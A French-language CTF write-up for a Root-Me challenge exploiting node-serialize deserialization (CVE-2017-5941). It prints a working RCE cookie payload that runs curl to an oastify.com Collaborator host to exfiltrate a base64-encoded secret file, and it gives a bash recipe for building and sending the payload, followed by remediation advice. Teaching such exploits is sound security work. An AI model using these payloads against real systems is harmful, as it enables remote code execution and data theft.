# Fiche récap — RCE par désérialisation Node.js (`node-serialize`)

> **Contexte** : challenge Root-Me (plateforme d'entraînement légale). Exploitation d'un cookie `profile` désérialisé côté serveur.
> **CVE** : CVE-2017-5941 — `node-serialize` / `serialize-to-js`.

---

## 1. La requête en un coup d'œil

Le seul élément intéressant de la requête HTTP est le cookie `profile` :

```
Cookie: ...; profile=eyJ1c2VyTmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigp...
```

C'est du **base64**. Une fois décodé :

```json
{
  "userName": "_$$ND_FUNC$$_function(){ require('child_process').exec('curl http://tb8lheg1uqknodk482a1dbe9j0prdh16.oastify.com/?d=$(cat flag/secret| base64 -w0)'); }()"
}
```

---

## 2. Pourquoi ça aboutit (la chaîne complète)

### Étape 1 — Le serveur désérialise un input contrôlé par l'utilisateur

L'application Node.js lit le cookie, le décode en base64, puis appelle probablement :

```js
const serialize = require('node-serialize');
let profile = serialize.unserialize(
  Buffer.from(req.cookies.profile, 'base64').toString()
);
```

**Problème** : l'utilisateur contrôle entièrement le contenu du cookie → il contrôle l'objet désérialisé.

### Étape 2 — Le marqueur magique `_$$ND_FUNC$$_`

`node-serialize` doit pouvoir sérialiser/désérialiser des **fonctions** (que `JSON.stringify` ne gère pas). Pour les reconstruire, il repère le préfixe `_$$ND_FUNC$$_` et passe le reste de la chaîne à **`eval()`** :

```js
// logique simplifiée de node-serialize
if (value.indexOf('_$$ND_FUNC$$_') === 0) {
  obj[key] = eval('(' + value.substring(FUNCFLAG.length) + ')');
}
```

→ Toute chaîne préfixée de ce marqueur devient du **code JS exécuté**.

### Étape 3 — L'IIFE : exécution immédiate

Normalement `eval` ne fait que **définir** la fonction (il faudrait encore l'appeler). Mais le payload se termine par `}()` :

```js
function(){ ... }()   // <-- IIFE : Immediately Invoked Function Expression
```

Les `()` finaux **invoquent** la fonction sur-le-champ. Le simple fait de désérialiser le cookie déclenche donc l'exécution, **sans qu'aucune route n'utilise `userName`**.

### Étape 4 — Le code exécuté : RCE via `child_process`

```js
require('child_process').exec(
  'curl http://....oastify.com/?d=$(cat flag/secret| base64 -w0)'
);
```

- `require('child_process').exec(...)` lance une **commande shell** sur le serveur.
- `cat flag/secret` lit le flag.
- `| base64 -w0` l'encode en base64 sur **une seule ligne** (`-w0` = pas de retour à la ligne) pour qu'il tienne proprement dans une URL sans casser le paramètre.
- `$(...)` = substitution de commande : le résultat est injecté dans l'URL avant l'appel `curl`.

### Étape 5 — Exfiltration hors-bande (OAST)

Pourquoi ne pas juste lire le flag dans la réponse HTTP ? Parce que c'est une **RCE aveugle** : la sortie de la commande n'apparaît nulle part dans la réponse du serveur.

Solution → **canal auxiliaire** : on fait émettre au serveur une requête sortante vers un domaine qu'on contrôle.

- `oastify.com` = domaine de **Burp Collaborator** (OAST = *Out-of-band Application Security Testing*).
- Le sous-domaine `tb8lheg1uqknodk482a1dbe9j0prdh16` est unique et rattaché à la session de l'attaquant.
- Le flag (en base64) arrive dans le paramètre `?d=...` → visible dans le journal Collaborator de l'attaquant.

```
Serveur victime  --curl-->  tb8l...oastify.com/?d=<flag_base64>
                                      │
                                      ▼
                         Burp Collaborator (attaquant) → lit le flag
```

---

## 3. Schéma de la chaîne d'attaque

```
Cookie base64
   │  (décodage)
   ▼
JSON { userName: "_$$ND_FUNC$$_function(){...}()" }
   │  (node-serialize.unserialize)
   ▼
Marqueur _$$ND_FUNC$$_ détecté → eval()
   │
   ▼
IIFE }()  → exécution immédiate
   │
   ▼
child_process.exec("curl ... $(cat flag/secret|base64)")
   │
   ▼
Requête sortante OAST → exfiltration du flag
```

---

## 4. Construire soi-même le payload

```bash
# 1. Préparer le JSON avec le marqueur et l'IIFE
PAYLOAD='{"userName":"_$$ND_FUNC$$_function(){ require(\"child_process\").exec(\"curl http://TON-ID.oastify.com/?d=$(cat flag/secret| base64 -w0)\"); }()"}'

# 2. Encoder en base64 (valeur du cookie profile)
echo -n "$PAYLOAD" | base64 -w0

# 3. Envoyer dans le cookie
curl 'http://challenge01.root-me.org:PORT/' \
     -H "Cookie: profile=<BASE64_CI-DESSUS>"
```

> Remplacer `TON-ID.oastify.com` par ton propre sous-domaine Collaborator (ou n'importe quel serveur HTTP que tu contrôles / `webhook.site`, `interactsh`, etc.).

---

## 5. Points clés à retenir

| Élément | Rôle |
|---|---|
| `node-serialize.unserialize()` | Fonction vulnérable, `eval` sur les fonctions sérialisées |
| `_$$ND_FUNC$$_` | Marqueur qui déclenche l'`eval()` |
| `}()` (IIFE) | Force l'exécution immédiate à la désérialisation |
| `child_process.exec` | Donne l'exécution de commandes système (RCE) |
| `base64 -w0` | Encode le flag pour le transport URL (une ligne) |
| `oastify.com` | Canal d'exfiltration out-of-band (RCE aveugle) |

---

## 6. Remédiation

- **Ne jamais désérialiser des données non fiables.** `node-serialize` est abandonné et dangereux par conception.
- Préférer `JSON.parse()` / `JSON.stringify()` (pas de fonctions, pas d'`eval`).
- Signer et chiffrer les cookies de session (ex. cookies signés HMAC, JWT correctement validés) pour empêcher toute altération.
- Appliquer le principe du moindre privilège + egress filtering (bloquer les connexions sortantes imprévues du serveur) pour casser l'exfiltration OAST.

---

*Vulnérabilité à exploiter uniquement dans un cadre légal et autorisé (CTF, labs, pentest sous mandat).*
